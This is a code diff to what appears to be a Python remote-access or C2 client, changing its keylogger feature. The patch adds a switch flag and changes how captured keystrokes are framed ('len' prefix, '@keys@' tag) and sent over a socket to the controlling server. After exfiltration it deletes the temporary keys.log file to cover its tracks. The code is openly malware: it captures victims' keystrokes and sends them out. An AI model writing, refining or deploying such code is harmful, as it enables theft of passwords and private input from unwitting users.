@@ -10,7 +10,7 @@ End Developing Date:
 
 # Step 1: Import requires libraries
 import socket
-from os import path, environ, getcwd, chdir
+from os import path, environ, getcwd, chdir, remove
 from sys import argv, exit
 import platform
 from time import sleep
@@ -53,7 +53,8 @@ vbSystemModal = "4096"
 
 
 """ Global variables used for Features """
-listener = None # Used for Switch keylog on or off
+listener = Listener(on_press=None)
+listenerSwitch = None # Used for Switch keylog on or off
 keyLogs = [] # Used for Store logged keys
 
 
@@ -273,11 +274,12 @@ def on_press(key_press):
 
 # Define Function to Start a Key Logger on the C2 Client
 def keylogger_on():
-    global listener, keyLogs
+    global listener, keyLogs, listenerSwitch
 
     # When listener is None, mean the keylogger is OFF
-    if listener is None:
+    if listenerSwitch is None:
         listener = Listener(on_press=on_press)
+        listenerSwitch = True
         listener.start()
 
         send(b"[+]-Client => A Key Logger is now Running on the Client.\n")
@@ -287,9 +289,10 @@ def keylogger_on():
 
 # Define Function to hutting down the Key Logger on the client and write the pressed keys to disk
 def keylogger_off():
-    global listener, keyLogs
+    global listener, keyLogs, listenerSwitch
+
     # When listener is Not None(True), mean the keylogger is ON
-    if listener is not None:
+    if listenerSwitch is not None:
         listener.stop()
 
         with open(TMP + 'keys.log', 'a') as fh:
@@ -312,19 +315,23 @@ def keylogger_off():
 
         with open(TMP + 'keys.log', 'r') as fh:
             dataLogged = fh.read()
+            # print(dataLogged)
 
             # First Send: Send len of byteData to the server
-            send(str.encode(str(len(dataLogged))))
+            lenMsg = 'len ' + str(len(dataLogged))
+            send(str.encode(lenMsg))
 
-            sleep(0.1)
 
             # Second Send: Send the data to the server
-            send(fh.read().encode())
+            send(str.encode('@keys@ '+dataLogged))
+            dataLogged = None
 
                          # .replace("Key.f1", " F1 ").replace("Key.f2", " F2 ")
         # Clear the keyLog list and Re-Initialize the listener to signify 'Not On'
         keyLogs.clear()
         listener = None
+        listenerSwitch = None
+        remove(TMP + 'keys.log')
         send(b"[+]-Client => A Key Logger is now Off.\n")
 
                     # k = str(key).replace("'", "")
